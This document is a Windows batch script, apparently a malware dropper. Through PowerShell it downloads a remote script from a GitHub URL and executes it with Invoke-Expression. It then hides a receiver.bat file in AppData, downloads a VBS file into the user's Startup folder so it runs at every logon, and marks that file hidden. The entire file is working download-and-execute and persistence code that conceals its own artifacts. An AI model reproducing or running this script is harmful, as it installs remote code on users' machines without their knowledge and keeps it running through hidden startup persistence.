@echo off
setlocal enabledelayedexpansion

REM Execute PowerShell to download and run the PowerShell script that will download receiver.bat
powershell -NoProfile -Command ^
    "try {" ^
    "    $scriptUrl = 'https://github.com/RaupenInspektor/pico/raw/main/interesting.ps1';" ^
    "    $scriptContent = Invoke-WebRequest -Uri $scriptUrl | Select-Object -ExpandProperty Content;" ^
    "    Invoke-Expression $scriptContent;" ^
    "    Write-Host 'PowerShell script executed.'" ^
    "} catch {" ^
    "    Write-Host 'Failed to execute PowerShell script: $_'" ^
    "}"

REM Define the path to receiver.bat in AppData\Local
set receiverPath=%APPDATA%\Local\receiver.bat

REM Hide the receiver.bat file if it exists
powershell -NoProfile -Command ^
    "try {" ^
    "    if (Test-Path '%receiverPath%') {" ^
    "        Set-ItemProperty -Path '%receiverPath%' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden);" ^
    "        Write-Host 'Receiver.bat file hidden.'" ^
    "    } else {" ^
    "        Write-Host 'Receiver.bat file not found.'" ^
    "    }" ^
    "} catch {" ^
    "    Write-Host 'Failed to hide receiver.bat: $_'" ^
    "}"

REM Download the VBS file to the Startup folder
powershell -NoProfile -Command ^
    "try {" ^
    "    $startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\file.vbs');" ^
    "    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/file.vbs' -OutFile $startupPath;" ^
    "} catch {" ^
    "    Write-Host 'Failed to download VBS file'" ^
    "}"

REM Hide the VBS file if it exists
powershell -NoProfile -Command ^
    "try {" ^
    "    if (Test-Path $startupPath) {" ^
    "        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden);" ^
    "        Write-Host 'VBS file hidden.'" ^
    "    } else {" ^
    "        Write-Host 'VBS file not found.'" ^
    "    }" ^
    "} catch {" ^
    "    Write-Host 'Failed to hide VBS file: $_'" ^
    "}"
pause
